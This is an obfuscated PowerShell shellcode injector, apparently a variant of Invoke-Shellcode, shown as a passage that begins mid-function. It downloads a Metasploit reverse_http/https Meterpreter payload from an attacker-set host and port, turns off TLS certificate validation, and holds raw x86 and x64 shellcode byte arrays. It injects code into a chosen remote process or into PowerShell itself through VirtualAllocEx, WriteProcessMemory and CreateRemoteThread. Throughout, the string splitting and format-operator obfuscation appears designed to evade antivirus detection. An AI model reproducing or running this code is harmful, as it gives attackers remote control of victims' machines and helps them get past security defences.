                ${COmMA`ND} = "function $($MyInvocation.InvocationName) {`n" + ${my`I`N`Vo`cation}."mY`COmMaNd"."sC`RIpTB`LO`cK" + "`n}`n$($RootInvocation)`n`n"
            }
            else
            {
                &("{0}{1}{3}{2}{4}" -f'Wr','it','s','e-Verbo','e') ('Execut'+'ing'+' '+'th'+'e '+'f'+'ollo'+'w'+'ing '+'f'+'rom '+'32'+'-bit '+'PowerS'+'he'+'l'+'l: '+"$RootInvocation "+'-'+'Force')
                ${cO`mMA`Nd} = "function $($MyInvocation.InvocationName) {`n" + ${mYINv`o`CatIon}."MYc`O`mMA`ND"."sCRIptBl`O`CK" + "`n}`n$($RootInvocation) -Force`n`n"
            }

            ${Co`mMANDb`y`T`eS} =   $r57Qe::"aSc`Ii".("{1}{2}{0}" -f 'tBytes','G','e').Invoke(${C`oMm`AnD})
            ${en`c`oDeD`cOmmANd} =  $Vg7P8::"ToBA`s`E64STR`Ing"(${CO`MMAN`d`BYTEs})

            ${eX`EC`Ute} = ((('2tkComm'+'and')-REplAce  ([chaR]50+[chaR]116+[chaR]107),[chaR]36)) + (' '+('N'+'Ku ')."r`Epl`Ace"(([CHAr]78+[CHAr]75+[CHAr]117),'|')+"$Env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "+'-N'+'oProf'+'ile '+'-Comm'+'a'+'nd '+'-')
            &("{2}{1}{3}{0}" -f 'on','voke','In','-Expressi') -Command ${E`XEC`Ute} | &("{1}{2}{0}" -f 'l','Ou','t-Nul')

            
            Return
        }
        
        ${re`SP`OnSe} = ${Tr`Ue}
        
        if ( ${FO`RcE} -or ( ${R`eSP`ONsE} = ${p`SC`m`DLeT}.("{2}{0}{1}"-f 'ouldContin','ue','Sh').Invoke( ((("{1}{0}{2}{3}{6}{5}{7}{4}"-f'u','Do yo',' kn','ow ','Gre doing?',' you7','what','k'))."r`eplA`Ce"(([chAr]55+[chAr]107+[chAr]71),[StrIng][chAr]39)),
               "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), LPORT=$($Lport) " ) ) ) { }
        
        if ( !${r`es`PoNSe} )
        {
            
            Return
        }
        
        switch (${p`AY`LOAd})
        {
            ("{9}{4}{6}{7}{0}{1}{3}{5}{2}{8}"-f 'ws/m','eter','ter','p','i','re','n','do','/reverse_http','w')
            {
                ${s`Sl} = ''
            }
            
            ("{2}{0}{6}{3}{1}{5}{7}{4}"-f '/meterp','r','windows','/','https','everse','reter','_')
            {
                ${S`sL} = 's'
                
                  $m5uE03::"s`eR`VERcErT`i`FIcA`TEva`lIda`T`ion`cAllBa`CK" = {${tr`Ue}}
            }
        }
        
        if (${l`E`GaCY}) 
        {
            
            ${rE`qu`est} = "http$($SSL)://$($Lhost):$($Lport)/INITM"
            &("{2}{1}{0}" -f'rbose','e-Ve','Writ') ('Re'+'q'+'uesting '+'meterpr'+'ete'+'r '+'pay'+'lo'+'ad '+'from'+' '+"$Request")
        } else {

            
            ${CHa`Rar`R`AY} = 48..57 + 65..90 + 97..122 | &("{1}{2}{0}" -f 'ach-Object','For','E') {[Char]${_}}
            ${Su`MTE`ST} = ${F`ALSE}

            while (${sum`Te`ST} -eq ${F`Al`se}) 
            {
                ${gen`ERA`TEdURI} = ${ch`A`Rarray} | &("{0}{2}{1}" -f'Ge','ndom','t-Ra') -Count 4
                ${s`U`mTEST} = (([int[]] ${GE`NER`AtED`UrI} | &("{1}{3}{2}{0}{4}" -f 'ure','Me','s','a','-Object') -Sum)."s`Um" % 0x100 -eq 92)
            }

            ${RE`QuestU`RI} = -join ${gen`ERa`TedURi}

            ${R`EquE`sT} = "http$($SSL)://$($Lhost):$($Lport)/$($RequestUri)" 
        }
           
        ${U`Ri} = &("{2}{1}{0}"-f'Object','w-','Ne') ("{1}{0}"-f 'ri','U')(${r`equEst})
        ${W`e`BClIeNt} = &("{0}{2}{1}"-f 'New-Ob','ect','j') ("{1}{2}{3}{0}"-f'nt','S','ystem.Net','.WebClie')
        ${w`ebC`LieNT}."H`Eaders".("{0}{1}"-f'A','dd').Invoke(("{3}{0}{2}{1}" -f'r-','ent','ag','use'), "$UserAgent")
        
        if (${Pr`OxY})
        {
            ${w`EbPRoXY`OB`J`ECT} = &("{0}{1}{2}"-f 'New','-','Object') ("{0}{2}{3}{1}{4}" -f 'Syste','.WebPro','m','.Net','xy')
            ${PR`oXya`dd`ResS} = (&("{2}{4}{0}{1}{3}" -f '-It','emPropert','Ge','y','t') -Path ((("{8}{0}{13}{4}{10}{2}{9}{14}{6}{5}{7}{11}{1}{3}{12}" -f'CU:T20SoftwareT20','nternet Setti','tT','ng','os','nt','T20Curre','Vers','HK','20Windo','of','ionT20I','s','Micr','ws')) -CRePlaCe([chAR]84+[chAR]50+[chAR]48),[chAR]92))."p`RoXySeR`V`eR"
            
            
            if (${ProXy`ADd`R`Ess}) 
            {
            
                ${WeBP`R`OxYo`B`jEcT}."aDdr`EsS" = ${PROxY`AD`drESS}
                ${WeB`Pro`xyO`BJECT}."uSEdE`Fa`U`LtCREdENTIals" = ${tR`UE}
                ${We`BcLIENT`oBj`ecT}."P`RoXY" = ${WeBP`ROX`YoBj`e`ct}
            }
        }

        try
        {
            [Byte[]] ${sH`ELlCod`e`32} = ${W`EbcLI`ENT}.("{2}{1}{0}" -f 'Data','oad','Downl').Invoke(${U`RI})
        }
        catch
        {
            Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
        }
        [Byte[]] ${SHelLco`D`e`64} = ${Shel`Lc`ode32}

    }
    elseif (${pSBO`U`Ndpar`AmetErS}[("{0}{1}{2}"-f'She','llcod','e')])
    {
        
        
        [Byte[]] ${shEl`lC`o`DE32} = ${ShEllC`O`DE}
        [Byte[]] ${Sh`ElLcodE`64} = ${shEl`LcodE`32}
    }
    else
    {
        
        
        
        
        
        [Byte[]] ${sH`ELlc`ODE`32} = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00)

        
        
        [Byte[]] ${SheL`L`CODe64} = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
    }

    if ( ${PS`BOUN`DPara`meteRs}[("{1}{0}{2}"-f 'ssI','Proce','D')] )
    {
        
        ${op`e`NPr`ocEsSaDdr} = &("{1}{2}{0}"-f 'dress','Get-ProcA','d') ("{1}{0}{3}{2}"-f'n','ker','l','el32.dl') ("{2}{0}{1}" -f'Proce','ss','Open')
        ${OPEn`prOcES`Sd`E`l`eg`ATe} = &("{4}{2}{1}{3}{0}" -f'pe','ega','l','teTy','Get-De') @([UInt32], [Bool], [UInt32]) ([IntPtr])
        ${OpE`Npr`oCe`ss} =   (&("{2}{1}{0}" -f'arIaBLe','v','Get-')  ("{0}{1}" -f 'C','jTu') -vALueO  )::("{4}{3}{5}{6}{1}{2}{0}" -f 'ter','nctionP','oin','e','GetDel','gat','eForFu').Invoke(${O`pEnproCES`SAD`Dr}, ${O`P`EN`pROceSSd`ElE`g`AtE})
        ${vi`R`TU`AlaL`LoCexa`D`dR} = &("{0}{1}{2}{4}{3}" -f 'Ge','t-','P','dress','rocAd') ("{1}{0}{2}" -f 'el32.dl','kern','l') ("{2}{0}{1}" -f 'oc','Ex','VirtualAll')
        ${V`IRt`UALall`oc`EXDE`l`egATE} = &("{2}{1}{5}{4}{0}{3}"-f 'lega','e','G','teType','-De','t') @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        ${ViR`TU`AlAll`OC`Ex} =  (&("{0}{1}" -f 'VarIAB','lE') ("{1}{0}" -f 'tu','Cj')  -ValUEOnLy)::("{7}{4}{8}{2}{5}{3}{6}{0}{1}"-f 'Point','er','eFor','o','el','Functi','n','GetD','egat').Invoke(${vi`RT`UalallO`CE`x`AdDR}, ${vi`R`TuA`L`AlLOC`EXdEL`egATe})
        ${w`RiTEPr`OcES`SMemorY`A`ddR} = &("{0}{1}{3}{2}" -f'G','et-ProcA','dress','d') ("{3}{1}{0}{2}"-f'.','32','dll','kernel') ("{3}{0}{2}{1}{4}" -f'i','ocessMemor','tePr','Wr','y')
        ${wRItEpRocEsSm`emo`R`y`deLEGAte} = &("{0}{4}{1}{3}{2}" -f 'Get','Deleg','e','ateTyp','-') @([IntPtr], [IntPtr], [Byte[]], [UInt32],  ( &("{2}{0}{1}" -f 'IaB','Le','VAR') ("4G"+"b") -VAluE).("{1}{2}{0}"-f'RefType','M','akeBy').Invoke()) ([Bool])
        ${WritE`pr`OC`ESSmeM`Ory} =  (&("{0}{2}{1}"-f'gEt','le','-vArIaB')  ('c'+'JtU') -vaL  )::("{0}{4}{2}{6}{3}{5}{1}" -f 'Ge','Pointer','D','egateForFun','t','ction','el').Invoke(${Wr`itEp`RoceS`Sm`e`Mor`YAddR}, ${wRIteprocESSMem`o`RY`DelEga`TE})
        ${CR`eAte`R`e`mOt`ethrEA`Dad`dr} = &("{2}{0}{3}{1}" -f't-Pr','dress','Ge','ocAd') ("{2}{1}{3}{0}" -f 'dll','nel3','ker','2.') ("{1}{4}{2}{5}{3}{0}" -f 'd','C','eat','ea','r','eRemoteThr')
        ${cRE`A`TERE`MOTET`HRea`dD`el`e`GaTe} = &("{2}{1}{0}{3}"-f 'gat','Dele','Get-','eType') @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${cReaT`erEm`OtethR`eAd} =   $CJTU::("{6}{2}{3}{5}{4}{0}{1}"-f'Func','tionPointer','et','De','eFor','legat','G').Invoke(${c`Rea`TEREMoTE`T`hrE`AdA`dDR}, ${crEaTERe`motE`ThReaDd`EL`egaTe})
        ${c`loS`ehaND`LeADdr} = &("{2}{1}{0}{3}"-f 'ocA','t-Pr','Ge','ddress') ("{0}{2}{1}" -f'ker','.dll','nel32') ("{2}{0}{1}{3}"-f'lo','se','C','Handle')
        ${clOs`ehanDlE`del`eg`A`TE} = &("{0}{1}{4}{2}{3}"-f 'G','et-De','ega','teType','l') @([IntPtr]) ([Bool])
        ${CL`OS`EhaNDLE} =   $cJtu::("{1}{5}{3}{0}{2}{6}{4}{7}" -f'o','G','rFunc','F','onP','etDelegate','ti','ointer').Invoke(${C`l`Os`EhAN`DLEADdR}, ${ClosehAndL`EDE`le`GaTE})
    
        &("{1}{3}{0}{2}"-f 'os','Write-Ve','e','rb') ('Injecti'+'n'+'g '+'shel'+'lcod'+'e '+'in'+'to '+'PID'+': '+"$ProcessId")
        
        if ( ${FO`RcE} -or ${p`SCMd`L`eT}.("{0}{2}{3}{1}" -f'ShouldC','ue','ont','in').Invoke( ("{9}{7}{1}{5}{6}{4}{11}{2}{8}{0}{10}{3}" -f'i','sh t','u','lans?','ut ','o ','carry o',' wi','r ev','Do you','l p','yo'),
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)! " ) )
        {
            &("{0}{1}{5}{6}{2}{4}{3}"-f 'I','nj','moteShe','e','llcod','e','ct-Re') ${pRoCE`ss`Id}
        }
    }
    else
    {
        
        ${vI`RTUa`la`lL`ocAddR} = &("{4}{1}{2}{0}{3}"-f 'dre','r','ocAd','ss','Get-P') ("{2}{0}{1}{3}"-f 'er','nel32.','k','dll') ("{2}{1}{0}"-f'oc','rtualAll','Vi')
        ${v`IRtuAlALloC`D`Ele`GAte} = &("{1}{0}{4}{3}{2}" -f 'ga','Get-Dele','ype','T','te') @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        ${VirtU`Al`A`Lloc} =   $CjTu::("{2}{3}{4}{0}{1}"-f'n','ter','GetDelegate','ForFunction','Poi').Invoke(${viRtuA`L`ALLOc`AddR}, ${v`IRTUa`laLL`o`CdeleGAte})
        ${Vi`R`TuAlFR`EeaddR} = &("{2}{1}{0}"-f'ddress','rocA','Get-P') ("{1}{2}{0}{3}"-f '2.','kerne','l3','dll') ("{1}{2}{0}" -f'lFree','V','irtua')
        ${ViRtU`Al`FREeD`e`LegA`TE} = &("{0}{1}{2}{3}"-f'Get','-Dele','g','ateType') @([IntPtr], [Uint32], [UInt32]) ([Bool])
        ${vIR`TUAl`F`REE} =  (&("{2}{0}{3}{1}" -f 'eT-Va','iabLe','G','r')  ("C"+"jTu")  -VAlUe)::("{5}{4}{2}{3}{0}{1}" -f'o','nPointer','ForFunc','ti','tDelegate','Ge').Invoke(${vIrT`UAl`F`RE`Ea`ddR}, ${vir`Tu`A`Lfr`eedeLEg`AtE})
        ${C`RE`At`E`THReADADdr} = &("{4}{0}{1}{2}{3}"-f 'Pro','cAdd','res','s','Get-') ("{1}{2}{0}{3}" -f 'el32.dl','ke','rn','l') ("{1}{2}{0}" -f 'd','Create','Threa')
        ${c`REAT`e`Threadd`EL`EGate} = &("{2}{1}{0}{5}{3}{4}" -f 'Del','t-','Ge','eTy','pe','egat') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${CR`eA`T`ethReAD} =   (&("{2}{0}{1}" -f'T-i','TEm','GE')  ("{2}{0}{1}"-f 'Iab','Le:CjtU','VAr')).vaLUe::("{0}{7}{8}{5}{3}{4}{2}{6}{1}" -f 'GetD','nter','Po','uncti','on','F','i','eleg','ateFor').Invoke(${CreAT`ethR`e`AdaD`Dr}, ${c`Re`A`T`eThreAD`deLEGATE})
        ${Wa`itFOrsIn`GL`Eo`BJECtaddr} = &("{3}{2}{1}{0}"-f'ss','e','rocAddr','Get-P') ("{1}{0}{2}"-f 'el32','kern','.dll') ("{3}{0}{1}{2}" -f'b','jec','t','WaitForSingleO')
        ${Wait`FoRSin`GL`eoBJecTdeLeGa`Te} = &("{1}{0}{2}{3}{4}"-f't-','Ge','Del','egateTyp','e') @([IntPtr], [Int32]) ([Int])
        ${WAI`TFO`RSi`NGleObJECt} =  $CjtU::("{2}{0}{4}{6}{5}{3}{1}" -f 'DelegateForF','er','Get','oint','un','P','ction').Invoke(${w`Ai`TfoRSiN`Gl`e`ObJEcTAD`dr}, ${waItF`orsIngLE`oBjEC`TDe`L`eGAtE})
        
        &("{3}{0}{1}{2}" -f'i','te-','Verbose','Wr') ("{6}{4}{8}{1}{2}{5}{0}{3}{7}" -f'Powe','ellcode int','o','rS','cting s',' ','Inje','hell','h')
        
        if ( ${FOR`ce} -or ${Pscm`DL`ET}.("{1}{2}{3}{0}" -f 'e','Shou','ldCont','inu').Invoke( ("{10}{2}{9}{11}{3}{5}{0}{1}{8}{6}{4}{7}"-f 'out y','o','you wi',' to ',' p','carry ','evil','lans?','ur ','s','Do ','h'),
                 ("{8}{3}{4}{7}{6}{10}{9}{0}{1}{5}{2}" -f 'll',' ','ss!','ecting shellc','ode ','proce','the r','into ','Inj',' PowerShe','unning') ) )
        {
            &("{2}{1}{4}{0}{3}"-f'o','e','Inj','de','ct-LocalShellc')
        }
    }   
}